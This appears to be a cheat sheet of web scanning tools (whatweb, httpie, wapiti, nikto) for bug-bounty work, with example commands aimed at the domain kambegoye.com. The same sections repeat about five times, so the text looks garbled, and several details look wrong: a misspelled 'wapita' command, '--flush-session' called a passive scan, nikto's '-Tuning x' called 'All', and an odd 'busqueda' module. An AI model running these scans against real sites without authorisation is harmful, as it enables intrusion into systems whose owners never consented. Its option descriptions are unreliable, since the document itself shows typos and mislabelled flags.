- `php`, `asp`, `jsp` - Scripting languages
- `wordpress`, `drupal`, `joomla` - CMS
- `jquery`, `react`, `vue` - JS frameworks
- `aws-s3`, `google-analytics` - Cloud/CDN

**Tips**:
- Use `--aggression=3` for deeper fingerprinting
- Combine with nuclei for targeted vulnerability scanning
- Check for outdated versions (known CVEs)

---

### httpie - Human-Friendly HTTP Client
**Location**: `/usr/bin/http`
**Purpose**: Intuitive replacement for curl with better syntax and JSON support

**Use Cases**:
```bash
# Basic GET request
http kambegoye.com

# POST with JSON data
http POST kambegoye.com/api/login username=admin password=secret

# With headers
http GET kambegoye.com Authorization:"Bearer token"

# Form data
http -f POST kambegoye.com/search q=test category=api

# Download file
http -d kambegoye.com/image.jpg

# Upload file
http -f POST kambegoye.com/upload file@image.jpg

# Follow redirects
http --follow kambegoye.com

# Timeout
http --timeout=30 kambegoye.com

# Verbose (show request/response)
http -v kambegoye.com

# Session handling
http --session=auth kambegoye.com/login u=admin p=pass
http --session=auth kambegoye.com/secure

# Proxy support
http --proxy=http://proxy:8080 kambegoye.com
```

**Advantages over curl**:
- Automatic JSON formatting
- Readable colorized output
- Session persistence
- Simpler syntax

**Tips for Bug Bounty**:
- Use `http -v` to see exact headers being sent
- Test various HTTP methods (PUT, DELETE, PATCH)
- Check for HTTP parameter pollution
- Test HTTP desync attacks

---

### wapiti - Full Web Vulnerability Scanner
**Location**: `/usr/bin/wapiti`
**Purpose**: Comprehensive web application vulnerability scanner

**Use Cases**:
```bash
# Basic scan
wapiti -u kambegoye.com

# Scan with specific modules
wapiti -u kambegoye.com --modules struts,sql

# Full scan with all modules
wapiti -u kambegoye.com --modules all

# Scan with authentication
wapiti -u kambegoye.com --auth-type basic --auth-cred admin:secret
wapiti -u kambegoye.com --form-cred "http://target.com/login:username=admin&password=secret"

# With cookies
wapiti -u kambegoye.com --cookie "PHPSESSID=xxx"

# Crawl depth
wapiti -u kambegoye.com --depth 3

# Output formats
wapiti -u kambegoye.com -f json -o results/
wapiti -u kambegoye.com -f html -o report.html

# Scan specific paths only
wapita -u kambegoye.com --scope "kambegoye.com/api/*"

# Exclude paths
wapiti -u kambegoye.com --exclude "logout,admin"

# Passive scan (no exploitation)
wapiti -u kambegoye.com --flush-session

# Continue interrupted scan
wapiti -u kambegoye.com --continue
```

**Vulnerability Modules**:
- `backup` - Backup files disclosure
- `blindsql` - Blind SQL injection
- `busqueda` - Directory traversal
- `crlf` - CRLF injection
- `exec` - Command execution
- `file` - File handling issues
- `htaccess` - Misconfigured htaccess
- `nikto` - Nikto integration
- `sql` - SQL injection
- `ssrf` - Server-side request forgery
- `xss` - Cross-site scripting
- `xxe` - XML external entity

**Tips**:
- Use `--scope` to stay within target
- Scan with and without authentication
- Check JSON output for automation
- Combine with nuclei for validation

---

### nikto - Web Server Scanner
**Location**: `/usr/bin/nikto`
**Purpose**: Scan web servers for dangerous files, outdated software, configuration issues

**Use Cases**:
```bash
# Basic scan
nikto -h kambegoye.com

# HTTPS scan
nikto -h https://kambegoye.com

# With port
nikto -h kambegoye.com -p 8080

# Multiple ports
nikto -h kambegoye.com -p 80,443,8080

# Scan with authentication
nikto -h kambegoye.com -id admin:secret

# Cookies
nikto -h kambegoye.com -cookie "PHPSESSID=xxx"

# Tunings (reduce noise)
nikto -h kambegoye.com -Tuning 1  # Interesting files
nikto -h kambegoye.com -Tuning 2  # Misconfiguration
nikto -h kambegoye.com -Tuning 3  # Information disclosure
nikto -h kambegoye.com -Tuning x  # All

# Output formats
nikto -h kambegoye.com -o results.txt
nikto -h kambegoye.com -Format json -o results.json

# Pause between requests
nikto -h kambegoye.com -Pause 2

# Verbose
nikto -h kambegoye.com -v

# Update plugins
nikto -update

# List all tests
nikto -list-plugins
```

**Tuning Options**:
- `1` - Interesting files
- `2` - Misconfiguration
- `3` - Information disclosure
- `4` - Injection (XSS, etc.)
- `5` - Remote file retrieval
- `6` - Denial of service
- `7` - Remote file retrieval - IIS
- `8` - Command execution - remote
- `9` - SQL Injection
- `0` - File upload
- `a` - Authentication bypass
- `b` - Software identification
- `c` - Source code disclosure
- `d` - Path traversal
- `e` - Logic error

**Common Findings**:
- Default/admin files (/admin, /phpmyadmin)
- Outdated software versions
- Missing security headers
- HTTP methods enabled (TRACE, OPTIONS)
- Sensitive info in headers
- SSL/TLS issues

**Tips**:
- Use `-Tuning x` for comprehensive scan
- Check `-mutate` for directory brute force
- Combine with whatweb for tech identification
- Filter false positives with `-IgnoreCode`

---

## Quick Reference - New Tools

| Tool | Command | Purpose |
|------|---------|---------|
| whatweb | `whatweb target.com` | Technology fingerprinting |
| httpie | `http GET target.com` | Better HTTP client |
| wapiti | `wapiti -u target.com` | Full vulnerability scanner |
| nikto | `nikto -h target.com` | Web server scanner |

## Additional Web Tools (Just Installed)

### whatweb - Technology Fingerprinting
**Location**: `/usr/bin/whatweb`
**Purpose**: Identify technologies used by web servers (CMS, frameworks, libraries)

**Use Cases**:
```bash
# Basic scan
whatweb kambegoye.com

# Aggressive scan (more plugins)
whatweb kambegoye.com --aggression=3

# Scan multiple targets
whatweb target1.com target2.com --log-xml=results.xml

# Quick scan with minimal plugins
whatweb kambegoye.com --quick

# Detailed output
whatweb kambegoye.com -v

# Scan with specific plugins
whatweb kambegoye.com --plugins=nginx,php

# JSON output
whatweb kambegoye.com --log-json=results.json

# Custom wordlist
whatweb --input-file=targets.txt
```

**Common Plugins**:
- `nginx`, `apache`, `iis` - Web servers
- `php`, `asp`, `jsp` - Scripting languages
- `wordpress`, `drupal`, `joomla` - CMS
- `jquery`, `react`, `vue` - JS frameworks
- `aws-s3`, `google-analytics` - Cloud/CDN

**Tips**:
- Use `--aggression=3` for deeper fingerprinting
- Combine with nuclei for targeted vulnerability scanning
- Check for outdated versions (known CVEs)

---

### httpie - Human-Friendly HTTP Client
**Location**: `/usr/bin/http`
**Purpose**: Intuitive replacement for curl with better syntax and JSON support

**Use Cases**:
```bash
# Basic GET request
http kambegoye.com

# POST with JSON data
http POST kambegoye.com/api/login username=admin password=secret

# With headers
http GET kambegoye.com Authorization:"Bearer token"

# Form data
http -f POST kambegoye.com/search q=test category=api

# Download file
http -d kambegoye.com/image.jpg

# Upload file
http -f POST kambegoye.com/upload file@image.jpg

# Follow redirects
http --follow kambegoye.com

# Timeout
http --timeout=30 kambegoye.com

# Verbose (show request/response)
http -v kambegoye.com

# Session handling
http --session=auth kambegoye.com/login u=admin p=pass
http --session=auth kambegoye.com/secure

# Proxy support
http --proxy=http://proxy:8080 kambegoye.com
```

**Advantages over curl**:
- Automatic JSON formatting
- Readable colorized output
- Session persistence
- Simpler syntax

**Tips for Bug Bounty**:
- Use `http -v` to see exact headers being sent
- Test various HTTP methods (PUT, DELETE, PATCH)
- Check for HTTP parameter pollution
- Test HTTP desync attacks

---

### wapiti - Full Web Vulnerability Scanner
**Location**: `/usr/bin/wapiti`
**Purpose**: Comprehensive web application vulnerability scanner

**Use Cases**:
```bash
# Basic scan
wapiti -u kambegoye.com

# Scan with specific modules
wapiti -u kambegoye.com --modules struts,sql

# Full scan with all modules
wapiti -u kambegoye.com --modules all

# Scan with authentication
wapiti -u kambegoye.com --auth-type basic --auth-cred admin:secret
wapiti -u kambegoye.com --form-cred "http://target.com/login:username=admin&password=secret"

# With cookies
wapiti -u kambegoye.com --cookie "PHPSESSID=xxx"

# Crawl depth
wapiti -u kambegoye.com --depth 3

# Output formats
wapiti -u kambegoye.com -f json -o results/
wapiti -u kambegoye.com -f html -o report.html

# Scan specific paths only
wapita -u kambegoye.com --scope "kambegoye.com/api/*"

# Exclude paths
wapiti -u kambegoye.com --exclude "logout,admin"

# Passive scan (no exploitation)
wapiti -u kambegoye.com --flush-session

# Continue interrupted scan
wapiti -u kambegoye.com --continue
```

**Vulnerability Modules**:
- `backup` - Backup files disclosure
- `blindsql` - Blind SQL injection
- `busqueda` - Directory traversal
- `crlf` - CRLF injection
- `exec` - Command execution
- `file` - File handling issues
- `htaccess` - Misconfigured htaccess
- `nikto` - Nikto integration
- `sql` - SQL injection
- `ssrf` - Server-side request forgery
- `xss` - Cross-site scripting
- `xxe` - XML external entity

**Tips**:
- Use `--scope` to stay within target
- Scan with and without authentication
- Check JSON output for automation
- Combine with nuclei for validation

---

### nikto - Web Server Scanner
**Location**: `/usr/bin/nikto`
**Purpose**: Scan web servers for dangerous files, outdated software, configuration issues

**Use Cases**:
```bash
# Basic scan
nikto -h kambegoye.com

# HTTPS scan
nikto -h https://kambegoye.com

# With port
nikto -h kambegoye.com -p 8080

# Multiple ports
nikto -h kambegoye.com -p 80,443,8080

# Scan with authentication
nikto -h kambegoye.com -id admin:secret

# Cookies
nikto -h kambegoye.com -cookie "PHPSESSID=xxx"

# Tunings (reduce noise)
nikto -h kambegoye.com -Tuning 1  # Interesting files
nikto -h kambegoye.com -Tuning 2  # Misconfiguration
nikto -h kambegoye.com -Tuning 3  # Information disclosure
nikto -h kambegoye.com -Tuning x  # All

# Output formats
nikto -h kambegoye.com -o results.txt
nikto -h kambegoye.com -Format json -o results.json

# Pause between requests
nikto -h kambegoye.com -Pause 2

# Verbose
nikto -h kambegoye.com -v

# Update plugins
nikto -update

# List all tests
nikto -list-plugins
```

**Tuning Options**:
- `1` - Interesting files
- `2` - Misconfiguration
- `3` - Information disclosure
- `4` - Injection (XSS, etc.)
- `5` - Remote file retrieval
- `6` - Denial of service
- `7` - Remote file retrieval - IIS
- `8` - Command execution - remote
- `9` - SQL Injection
- `0` - File upload
- `a` - Authentication bypass
- `b` - Software identification
- `c` - Source code disclosure
- `d` - Path traversal
- `e` - Logic error

**Common Findings**:
- Default/admin files (/admin, /phpmyadmin)
- Outdated software versions
- Missing security headers
- HTTP methods enabled (TRACE, OPTIONS)
- Sensitive info in headers
- SSL/TLS issues

**Tips**:
- Use `-Tuning x` for comprehensive scan
- Check `-mutate` for directory brute force
- Combine with whatweb for tech identification
- Filter false positives with `-IgnoreCode`

---

## Quick Reference - New Tools

| Tool | Command | Purpose |
|------|---------|---------|
| whatweb | `whatweb target.com` | Technology fingerprinting |
| httpie | `http GET target.com` | Better HTTP client |
| wapiti | `wapiti -u target.com` | Full vulnerability scanner |
| nikto | `nikto -h target.com` | Web server scanner |

## Additional Web Tools (Just Installed)

### whatweb - Technology Fingerprinting
**Location**: `/usr/bin/whatweb`
**Purpose**: Identify technologies used by web servers (CMS, frameworks, libraries)

**Use Cases**:
```bash
# Basic scan
whatweb kambegoye.com

# Aggressive scan (more plugins)
whatweb kambegoye.com --aggression=3

# Scan multiple targets
whatweb target1.com target2.com --log-xml=results.xml

# Quick scan with minimal plugins
whatweb kambegoye.com --quick

# Detailed output
whatweb kambegoye.com -v

# Scan with specific plugins
whatweb kambegoye.com --plugins=nginx,php

# JSON output
whatweb kambegoye.com --log-json=results.json

# Custom wordlist
whatweb --input-file=targets.txt
```

**Common Plugins**:
- `nginx`, `apache`, `iis` - Web servers
- `php`, `asp`, `jsp` - Scripting languages
- `wordpress`, `drupal`, `joomla` - CMS
- `jquery`, `react`, `vue` - JS frameworks
- `aws-s3`, `google-analytics` - Cloud/CDN

**Tips**:
- Use `--aggression=3` for deeper fingerprinting
- Combine with nuclei for targeted vulnerability scanning
- Check for outdated versions (known CVEs)

---

### httpie - Human-Friendly HTTP Client
**Location**: `/usr/bin/http`
**Purpose**: Intuitive replacement for curl with better syntax and JSON support

**Use Cases**:
```bash
# Basic GET request
http kambegoye.com

# POST with JSON data
http POST kambegoye.com/api/login username=admin password=secret

# With headers
http GET kambegoye.com Authorization:"Bearer token"

# Form data
http -f POST kambegoye.com/search q=test category=api

# Download file
http -d kambegoye.com/image.jpg

# Upload file
http -f POST kambegoye.com/upload file@image.jpg

# Follow redirects
http --follow kambegoye.com

# Timeout
http --timeout=30 kambegoye.com

# Verbose (show request/response)
http -v kambegoye.com

# Session handling
http --session=auth kambegoye.com/login u=admin p=pass
http --session=auth kambegoye.com/secure

# Proxy support
http --proxy=http://proxy:8080 kambegoye.com
```

**Advantages over curl**:
- Automatic JSON formatting
- Readable colorized output
- Session persistence
- Simpler syntax

**Tips for Bug Bounty**:
- Use `http -v` to see exact headers being sent
- Test various HTTP methods (PUT, DELETE, PATCH)
- Check for HTTP parameter pollution
- Test HTTP desync attacks

---

### wapiti - Full Web Vulnerability Scanner
**Location**: `/usr/bin/wapiti`
**Purpose**: Comprehensive web application vulnerability scanner

**Use Cases**:
```bash
# Basic scan
wapiti -u kambegoye.com

# Scan with specific modules
wapiti -u kambegoye.com --modules struts,sql

# Full scan with all modules
wapiti -u kambegoye.com --modules all

# Scan with authentication
wapiti -u kambegoye.com --auth-type basic --auth-cred admin:secret
wapiti -u kambegoye.com --form-cred "http://target.com/login:username=admin&password=secret"

# With cookies
wapiti -u kambegoye.com --cookie "PHPSESSID=xxx"

# Crawl depth
wapiti -u kambegoye.com --depth 3

# Output formats
wapiti -u kambegoye.com -f json -o results/
wapiti -u kambegoye.com -f html -o report.html

# Scan specific paths only
wapita -u kambegoye.com --scope "kambegoye.com/api/*"

# Exclude paths
wapiti -u kambegoye.com --exclude "logout,admin"

# Passive scan (no exploitation)
wapiti -u kambegoye.com --flush-session

# Continue interrupted scan
wapiti -u kambegoye.com --continue
```

**Vulnerability Modules**:
- `backup` - Backup files disclosure
- `blindsql` - Blind SQL injection
- `busqueda` - Directory traversal
- `crlf` - CRLF injection
- `exec` - Command execution
- `file` - File handling issues
- `htaccess` - Misconfigured htaccess
- `nikto` - Nikto integration
- `sql` - SQL injection
- `ssrf` - Server-side request forgery
- `xss` - Cross-site scripting
- `xxe` - XML external entity

**Tips**:
- Use `--scope` to stay within target
- Scan with and without authentication
- Check JSON output for automation
- Combine with nuclei for validation

---

### nikto - Web Server Scanner
**Location**: `/usr/bin/nikto`
**Purpose**: Scan web servers for dangerous files, outdated software, configuration issues

**Use Cases**:
```bash
# Basic scan
nikto -h kambegoye.com

# HTTPS scan
nikto -h https://kambegoye.com

# With port
nikto -h kambegoye.com -p 8080

# Multiple ports
nikto -h kambegoye.com -p 80,443,8080

# Scan with authentication
nikto -h kambegoye.com -id admin:secret

# Cookies
nikto -h kambegoye.com -cookie "PHPSESSID=xxx"

# Tunings (reduce noise)
nikto -h kambegoye.com -Tuning 1  # Interesting files
nikto -h kambegoye.com -Tuning 2  # Misconfiguration
nikto -h kambegoye.com -Tuning 3  # Information disclosure
nikto -h kambegoye.com -Tuning x  # All

# Output formats
nikto -h kambegoye.com -o results.txt
nikto -h kambegoye.com -Format json -o results.json

# Pause between requests
nikto -h kambegoye.com -Pause 2

# Verbose
nikto -h kambegoye.com -v

# Update plugins
nikto -update

# List all tests
nikto -list-plugins
```

**Tuning Options**:
- `1` - Interesting files
- `2` - Misconfiguration
- `3` - Information disclosure
- `4` - Injection (XSS, etc.)
- `5` - Remote file retrieval
- `6` - Denial of service
- `7` - Remote file retrieval - IIS
- `8` - Command execution - remote
- `9` - SQL Injection
- `0` - File upload
- `a` - Authentication bypass
- `b` - Software identification
- `c` - Source code disclosure
- `d` - Path traversal
- `e` - Logic error

**Common Findings**:
- Default/admin files (/admin, /phpmyadmin)
- Outdated software versions
- Missing security headers
- HTTP methods enabled (TRACE, OPTIONS)
- Sensitive info in headers
- SSL/TLS issues

**Tips**:
- Use `-Tuning x` for comprehensive scan
- Check `-mutate` for directory brute force
- Combine with whatweb for tech identification
- Filter false positives with `-IgnoreCode`

---

## Quick Reference - New Tools

| Tool | Command | Purpose |
|------|---------|---------|
| whatweb | `whatweb target.com` | Technology fingerprinting |
| httpie | `http GET target.com` | Better HTTP client |
| wapiti | `wapiti -u target.com` | Full vulnerability scanner |
| nikto | `nikto -h target.com` | Web server scanner |

## Additional Web Tools (Just Installed)

### whatweb - Technology Fingerprinting
**Location**: `/usr/bin/whatweb`
**Purpose**: Identify technologies used by web servers (CMS, frameworks, libraries)

**Use Cases**:
```bash
# Basic scan
whatweb kambegoye.com

# Aggressive scan (more plugins)
whatweb kambegoye.com --aggression=3

# Scan multiple targets
whatweb target1.com target2.com --log-xml=results.xml

# Quick scan with minimal plugins
whatweb kambegoye.com --quick

# Detailed output
whatweb kambegoye.com -v

# Scan with specific plugins
whatweb kambegoye.com --plugins=nginx,php

# JSON output
whatweb kambegoye.com --log-json=results.json

# Custom wordlist
whatweb --input-file=targets.txt
```

**Common Plugins**:
- `nginx`, `apache`, `iis` - Web servers
- `php`, `asp`, `jsp` - Scripting languages
- `wordpress`, `drupal`, `joomla` - CMS
- `jquery`, `react`, `vue` - JS frameworks
- `aws-s3`, `google-analytics` - Cloud/CDN

**Tips**:
- Use `--aggression=3` for deeper fingerprinting
- Combine with nuclei for targeted vulnerability scanning
- Check for outdated versions (known CVEs)

---

### httpie - Human-Friendly HTTP Client
**Location**: `/usr/bin/http`
**Purpose**: Intuitive replacement for curl with better syntax and JSON support

**Use Cases**:
```bash
# Basic GET request
http kambegoye.com

# POST with JSON data
http POST kambegoye.com/api/login username=admin password=secret

# With headers
http GET kambegoye.com Authorization:"Bearer token"

# Form data
http -f POST kambegoye.com/search q=test category=api

# Download file
http -d kambegoye.com/image.jpg

# Upload file
http -f POST kambegoye.com/upload file@image.jpg

# Follow redirects
http --follow kambegoye.com

# Timeout
http --timeout=30 kambegoye.com

# Verbose (show request/response)
http -v kambegoye.com

# Session handling
http --session=auth kambegoye.com/login u=admin p=pass
http --session=auth kambegoye.com/secure

# Proxy support
http --proxy=http://proxy:8080 kambegoye.com
```

**Advantages over curl**:
- Automatic JSON formatting
- Readable colorized output
- Session persistence
- Simpler syntax

**Tips for Bug Bounty**:
- Use `http -v` to see exact headers being sent
- Test various HTTP methods (PUT, DELETE, PATCH)
- Check for HTTP parameter pollution
- Test HTTP desync attacks

---

### wapiti - Full Web Vulnerability Scanner
**Location**: `/usr/bin/wapiti`
**Purpose**: Comprehensive web application vulnerability scanner

**Use Cases**:
```bash
# Basic scan
wapiti -u kambegoye.com

# Scan with specific modules
wapiti -u kambegoye.com --modules struts,sql

# Full scan with all modules
wapiti -u kambegoye.com --modules all

# Scan with authentication
wapiti -u kambegoye.com --auth-type basic --auth-cred admin:secret
wapiti -u kambegoye.com --form-cred "http://target.com/login:username=admin&password=secret"

# With cookies
wapiti -u kambegoye.com --cookie "PHPSESSID=xxx"

# Crawl depth
wapiti -u kambegoye.com --depth 3

# Output formats
wapiti -u kambegoye.com -f json -o results/
wapiti -u kambegoye.com -f html -o report.html

# Scan specific paths only
wapita -u kambegoye.com --scope "kambegoye.com/api/*"

# Exclude paths
wapiti -u kambegoye.com --exclude "logout,admin"

# Passive scan (no exploitation)
wapiti -u kambegoye.com --flush-session

# Continue interrupted scan
wapiti -u kambegoye.com --continue
```

**Vulnerability Modules**:
- `backup` - Backup files disclosure
- `blindsql` - Blind SQL injection
- `busqueda` - Directory traversal
- `crlf` - CRLF injection
- `exec` - Command execution
- `file` - File handling issues
- `htaccess` - Misconfigured htaccess
- `nikto` - Nikto integration
- `sql` - SQL injection
- `ssrf` - Server-side request forgery
- `xss` - Cross-site scripting
- `xxe` - XML external entity

**Tips**:
- Use `--scope` to stay within target
- Scan with and without authentication
- Check JSON output for automation
- Combine with nuclei for validation

---

### nikto - Web Server Scanner
**Location**: `/usr/bin/nikto`
**Purpose**: Scan web servers for dangerous files, outdated software, configuration issues

**Use Cases**:
```bash
# Basic scan
nikto -h kambegoye.com

# HTTPS scan
nikto -h https://kambegoye.com

# With port
nikto -h kambegoye.com -p 8080

# Multiple ports
nikto -h kambegoye.com -p 80,443,8080

# Scan with authentication
nikto -h kambegoye.com -id admin:secret

# Cookies
nikto -h kambegoye.com -cookie "PHPSESSID=xxx"

# Tunings (reduce noise)
nikto -h kambegoye.com -Tuning 1  # Interesting files
nikto -h kambegoye.com -Tuning 2  # Misconfiguration
nikto -h kambegoye.com -Tuning 3  # Information disclosure
nikto -h kambegoye.com -Tuning x  # All

# Output formats
nikto -h kambegoye.com -o results.txt
nikto -h kambegoye.com -Format json -o results.json

# Pause between requests
nikto -h kambegoye.com -Pause 2

# Verbose
nikto -h kambegoye.com -v

# Update plugins
nikto -update

# List all tests
nikto -list-plugins
```

**Tuning Options**:
- `1` - Interesting files
- `2` - Misconfiguration
- `3` - Information disclosure
- `4` - Injection (XSS, etc.)
- `5` - Remote file retrieval
- `6` - Denial of service
- `7` - Remote file retrieval - IIS
- `8` - Command execution - remote
- `9` - SQL Injection
- `0` - File upload
- `a` - Authentication bypass
- `b` - Software identification
- `c` - Source code disclosure
- `d` - Path traversal
- `e` - Logic error

**Common Findings**:
- Default/admin files (/admin, /phpmyadmin)
- Outdated software versions
- Missing security headers
- HTTP methods enabled (TRACE, OPTIONS)
- Sensitive info in headers
- SSL/TLS issues

**Tips**:
- Use `-Tuning x` for comprehensive scan
- Check `-mutate` for directory brute force
- Combine with whatweb for tech identification
- Filter false positives with `-IgnoreCode`

---

## Quick Reference - New Tools

| Tool | Command | Purpose |
|------|---------|---------|
| whatweb | `whatweb target.com` | Technology fingerprinting |
| httpie | `http GET target.com` | Better HTTP client |
| wapiti | `wapiti -u target.com` | Full vulnerability scanner |
| nikto | `nikto -h target.com` | Web server scanner |

## Additional Web Tools (Just Installed)

### whatweb - Technology Fingerprinting
**Location**: `/usr/bin/whatweb`
**Purpose**: Identify technologies used by web servers (CMS, frameworks, libraries)

**Use Cases**:
```bash
# Basic scan
whatweb kambegoye.com

# Aggressive scan (more plugins)
whatweb kambegoye.com --aggression=3

# Scan multiple targets
whatweb target1.com target2.com --log-xml=results.xml

# Quick scan with minimal plugins
whatweb kambegoye.com --quick

# Detailed output
whatweb kambegoye.com -v

# Scan with specific plugins
whatweb kambegoye.com --plugins=nginx,php

# JSON output
whatweb kambegoye.com --log-json=results.json

# Custom wordlist
whatweb --input-file=targets.txt
```

**Common Plugins**:
- `nginx`, `apache`, `iis` - Web servers
- `php`, `asp`, `jsp` - Scripting languages
- `wordpress`, `drupal`, `joomla` - CMS
- `jquery`, `react`, `vue` - JS frameworks
- `aws-s3`, `google-analytics` - Cloud/CDN

**Tips**:
- Use `--aggression=3` for deeper fingerprinting
- Combine with nuclei for targeted vulnerability scanning
- Check for outdated versions (known CVEs)

---

### httpie - Human-Friendly HTTP Client
**Location**: `/usr/bin/http`
**Purpose**: Intuitive replacement for curl with better syntax and JSON support

**Use Cases**:
```bash
# Basic GET request
http kambegoye.com

# POST with JSON data
http POST kambegoye.com/api/login username=admin password=secret

# With headers
http GET kambegoye.com Authorization:"Bearer token"

# Form data
http -f POST kambegoye.com/search q=test category=api

# Download file
http -d kambegoye.com/image.jpg

# Upload file
http -f POST kambegoye.com/upload file@image.jpg

# Follow redirects
http --follow kambegoye.com

# Timeout
http --timeout=30 kambegoye.com

# Verbose (show request/response)
http -v kambegoye.com

# Session handling
http --session=auth kambegoye.com/login u=admin p=pass
http --session=auth kambegoye.com/secure

# Proxy support
http --proxy=http://proxy:8080 kambegoye.com
```

**Advantages over curl**:
- Automatic JSON formatting
- Readable colorized output
- Session persistence
- Simpler syntax

**Tips for Bug Bounty**:
- Use `http -v` to see exact headers being sent
- Test various HTTP methods (PUT, DELETE, PATCH)
- Check for HTTP parameter pollution
- Test HTTP desync attacks

---

### wapiti - Full Web Vulnerability Scanner
**Location**: `/usr/bin/wapiti`
**Purpose**: Comprehensive web application vulnerability scanner

**Use Cases**:
```bash
# Basic scan
wapiti -u kambegoye.com

# Scan with specific modules
wapiti -u kambegoye.com --modules struts,sql

# Full scan with all modules
wapiti -u kambegoye.com --modules all

# Scan with authentication
wapiti -u kambegoye.com --auth-type basic --auth-cred admin:secret
wapiti -u kambegoye.com --form-cred "http://target.com/login:username=admin&password=secret"

# With cookies
wapiti -u kambegoye.com --cookie "PHPSESSID=xxx"

# Crawl depth
wapiti -u kambegoye.com --depth 3

# Output formats
wapiti -u kambegoye.com -f json -o results/
wapiti -u kambegoye.com -f html -o report.html

# Scan specific paths only
wapita -u kambegoye.com --scope "kambegoye.com/api/*"

# Exclude paths
wapiti -u kambegoye.com --exclude "logout,admin"

# Passive scan (no exploitation)
wapiti -u kambegoye.com --flush-session

# Continue interrupted scan
wapiti -u kambegoye.com --continue
```

**Vulnerability Modules**:
- `backup` - Backup files disclosure
- `blindsql` - Blind SQL injection
- `busqueda` - Directory traversal
- `crlf` - CRLF injection
- `exec` - Command execution
- `file` - File handling issues
- `htaccess` - Misconfigured htaccess
- `nikto` - Nikto integration
- `sql` - SQL injection
- `ssrf` - Server-side request forgery
- `xss` - Cross-site scripting
- `xxe` - XML external entity

**Tips**:
- Use `--scope` to stay within target
- Scan with and without authentication
- Check JSON output for automation
- Combine with nuclei for validation

---

### nikto - Web Server Scanner
**Location**: `/usr/bin/nikto`
**Purpose**: Scan web servers for dangerous files, outdated software, configuration issues

**Use Cases**:
```bash
# Basic scan
nikto -h kambegoye.com

# HTTPS scan
nikto -h https://kambegoye.com

# With port
nikto -h kambegoye.com -p 8080

# Multiple ports
nikto -h kambegoye.com -p 80,443,8080

# Scan with authentication
nikto -h kambegoye.com -id admin:secret

# Cookies
nikto -h kambegoye.com -cookie "PHPSESSID=xxx"

# Tunings (reduce noise)
nikto -h kambegoye.com -Tuning 1  # Interesting files
nikto -h kambegoye.com -Tuning 2  # Misconfiguration
nikto -h kambegoye.com -Tuning 3  # Information disclosure
nikto -h kambegoye.com -Tuning x  # All

# Output formats
nikto -h kambegoye.com -o results.txt
nikto -h kambegoye.com -Format json -o results.json

# Pause between requests
nikto -h kambegoye.com -Pause 2

# Verbose
nikto -h kambegoye.com -v

# Update plugins
nikto -update

# List all tests
nikto -list-plugins
```

**Tuning Options**:
- `1` - Interesting files
- `2` - Misconfiguration
- `3` - Information disclosure
- `4` - Injection (XSS, etc.)
- `5` - Remote file retrieval
- `6` - Denial of service
- `7` - Remote file retrieval - IIS
- `8` - Command execution - remote
- `9` - SQL Injection
- `0` - File upload
- `a` - Authentication bypass
- `b` - Software identification
- `c` - Source code disclosure
- `d` - Path traversal
- `e` - Logic error

**Common Findings**:
- Default/admin files (/admin, /phpmyadmin)
- Outdated software versions
- Missing security headers
- HTTP methods enabled (TRACE, OPTIONS)
- Sensitive info in headers
- SSL/TLS issues

**Tips**:
- Use `-Tuning x` for comprehensive scan
- Check `-mutate` for directory brute force
- Combine with whatweb for tech identification
- Filter false positives with `-IgnoreCode`

---

## Quick Reference - New Tools

| Tool | Command | Purpose |
|------|---------|---------|
| whatweb | `whatweb target.com` | Technology fingerprinting |
| httpie | `http GET target.com` | Better HTTP client |
| wapiti | `wapiti -u target.com` | Full vulnerability scanner |
| nikto | `nikto -h target.com` | Web server scanner |

## Additional Web Tools (Just Installed)

### whatweb - Technology Fingerprinting
**Location**: `/usr/bin/whatweb`
**Purpose**: Identify technologies used by web servers (CMS, frameworks, libraries)

**Use Cases**:
```bash
# Basic scan
whatweb kambegoye.com

# Aggressive scan (more plugins)
whatweb kambegoye.com --aggression=3

# Scan multiple targets
whatweb target1.com target2.com --log-xml=results.xml

# Quick scan with minimal plugins
whatweb kambegoye.com --quick

# Detailed output
whatweb kambegoye.com -v

# Scan with specific plugins
whatweb kambegoye.com --plugins=nginx,php

# JSON output
whatweb kambegoye.com --log-json=results.json

# Custom wordlist
whatweb --input-file=targets.txt
```

**Common Plugins**:
- `nginx`, `apache`, `iis` - Web servers
- `php`, `asp`, `jsp` - Scripting languages
- `wordpress`, `drupal`, `joomla` - CMS
- `jquery`, `react`, `vue` - JS frameworks
- `aws-s3`, `google-analytics` - Cloud/CDN

**Tips**:
- Use `--aggression=3` for deeper fingerprinting
- Combine with nuclei for targeted vulnerability scanning
- Check for outdated versions (known CVEs)

---

### httpie - Human-Friendly HTTP Client
**Location**: `/usr/bin/http`
**Purpose**: Intuitive replacement for curl with better syntax and JSON support

**Use Cases**:
```bash
# Basic GET request
http kambegoye.com

# POST with JSON data
http POST kambegoye.com/api/login username=admin password=secret

# With headers
http GET kambegoye.com Authorization:"Bearer token"

# Form data
http -f POST kambegoye.com/search q=test category=api

# Download file
http -d kambegoye.com/image.jpg

# Upload file
http -f POST kambegoye.com/upload file@image.jpg

# Follow redirects
http --follow kambegoye.com

# Timeout
http --timeout=30 kambegoye.com

# Verbose (show request/response)
http -v kambegoye.com

# Session handling
http --session=auth kambegoye.com/login u=admin p=pass
http --session=auth kambegoye.com/secure

# Proxy support
http --proxy=http://proxy:8080 kambegoye.com
```

**Advantages over curl**:
- Automatic JSON formatting
- Readable colorized output
- Session persistence
- Simpler syntax

**Tips for Bug Bounty**:
- Use `http -v` to see exact headers being sent
- Test various HTTP methods (PUT, DELETE, PATCH)
- Check for HTTP parameter pollution
- Test HTTP desync attacks

---

### wapiti - Full Web Vulnerability Scanner
**Location**: `/usr/bin/wapiti`
**Purpose**: Comprehensive web application vulnerability scanner

**Use Cases**:
```bash
# Basic scan
wapiti -u kambegoye.com

# Scan with specific modules
wapiti -u kambegoye.com --modules struts,sql

# Full scan with all modules
wapiti -u kambegoye.com --modules all

# Scan with authentication
wapiti -u kambegoye.com --auth-type basic --auth-cred admin:secret
wapiti -u kambegoye.com --form-cred "http://target.com/login:username=admin&password=secret"

# With cookies
wapiti -u kambegoye.com --cookie "PHPSESSID=xxx"

# Crawl depth
wapiti -u kambegoye.com --depth 3

# Output formats
wapiti -u kambegoye.com -f json -o results/
wapiti -u kambegoye.com -f html -o report.html

# Scan specific paths only
wapita -u kambegoye.com --scope "kambegoye.com/api/*"

# Exclude paths
wapiti -u kambegoye.com --exclude "logout,admin"

# Passive scan (no exploitation)
wapiti -u kambegoye.com --flush-session

# Continue interrupted scan
wapiti -u kambegoye.com --continue
```

**Vulnerability Modules**:
- `backup` - Backup files disclosure
- `blindsql` - Blind SQL injection
- `busqueda` - Directory traversal
- `crlf` - CRLF injection
